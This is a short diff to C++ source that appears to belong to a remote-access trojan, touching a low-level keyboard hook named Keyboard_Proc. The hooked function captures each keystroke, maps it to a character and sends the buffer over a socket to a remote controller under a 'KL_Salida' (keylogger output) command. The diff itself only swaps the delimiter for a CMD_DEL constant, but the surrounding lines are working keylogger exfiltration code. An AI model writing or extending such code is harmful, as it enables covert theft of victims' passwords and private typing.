@@ -361,7 +361,7 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
         }
         strTempBuffer += c_KeyMap((unsigned int)kbs->vkCode);
         std::string strComando = std::to_string(EnumComandos::KL_Salida);
-        strComando.append(1, '\\');
+        strComando.append(1, CMD_DEL);
         strComando += strTempBuffer;
         cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false); 
     }
@@ -376,7 +376,7 @@ LRESULT CALLBACK Keyboard_Proc(int nCode, WPARAM wparam, LPARAM lparam) {
             strTempBuffer += Add_Terminator(c_KeyMap((int)kbs->vkCode));
 
             std::string strComando = std::to_string(EnumComandos::KL_Salida);
-            strComando.append(1, '\\');
+            strComando.append(1, CMD_DEL);
             strComando += strTempBuffer;
             cCliente->cSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, false);
         }
